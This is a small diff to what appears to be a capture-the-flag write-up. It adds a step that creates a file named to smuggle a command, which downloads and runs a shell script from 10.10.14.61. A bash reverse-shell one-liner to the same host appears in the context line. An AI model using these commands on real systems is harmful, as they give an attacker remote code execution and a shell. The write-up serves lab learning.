@@ -193,6 +193,12 @@ bash -i >& /dev/tcp/10.10.14.61/1337 0>&1
 
 Ill first make the shell
 
+```python
+touch -- "-TT wget 10.10.14.61 -O shell.sh; bash shell.sh"
+```
+
+Then ill remake the second file, this will get index.html by default
+
 
 
 
